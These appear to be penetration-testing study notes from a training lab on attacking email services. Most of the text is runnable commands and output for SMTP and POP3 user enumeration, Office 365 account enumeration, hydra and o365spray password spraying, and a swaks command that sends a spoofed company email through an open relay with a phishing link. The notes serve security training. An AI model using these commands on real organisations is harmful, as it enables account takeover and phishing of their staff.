# Enumeration
```bash
host -t MX microsoft.com

microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
```

```bash
dig mx plaintext.do | grep "MX" | grep -v ";"

plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
plaintext.do.           7076    IN      MX      10 mx.zoho.com.
plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
```

```bash
host -t A mail1.inlanefreight.htb.

mail1.inlanefreight.htb has address 10.129.14.128
```
## Ports
**Port** 	        **Service**
TCP/25 	    SMTP Unencrypted
TCP/143 	    IMAP4 Unencrypted
TCP/110 	    POP3 Unencrypted
TCP/465 	SMTP Encrypted
TCP/587 	SMTP Encrypted/STARTTLS
TCP/993 	IMAP4 Encrypted
TCP/995 	POP3 Encrypted
## Misconfigurations
### SMTP
```bash
# check username validity
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


VRFY root

252 2.0.0 root


VRFY www-data

252 2.0.0 www-data


VRFY new-user

550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table

# show all users in list
EXPN john

250 2.1.0 john@inlanefreight.htb


EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb

# dunno what it is
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)


MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown


RCPT TO:kate

550 5.1.1 kate... User unknown


RCPT TO:john

250 2.1.5 john... Recipient ok
```
### POP3
```bash
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio
-ERR

USER john
+OK

PASS 8Ns8j1b!23hs4921smHzwn
+OK Logged in.

LIST
+OK 1 messages:
1 1630
.
RETR 1
<MAIL CONTENT>
```
### Automation
https://github.com/pentestmonkey/smtp-user-enum
```bash
git clone https://github.com/pentestmonkey/smtp-user-enum&& cd smtp-user-enum
# -M VRFY, EXPN, RCPT
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
# Cloud enumeration
## Microsoft Office 365
https://github.com/0xZDH/o365spray
```bash
python3 o365spray.py --validate --domain msplaintext.xyz

python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
<SNIP>
[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'
```
# Password Attacks
```bash
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3

# cloud password spraying
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
# Open relay
Messaging servers that are accidentally or intentionally configured as open relays allow mail from any source to be transparently re-routed through the open relay server. 
```bash
# detect open relay
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
# connect and send mail
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```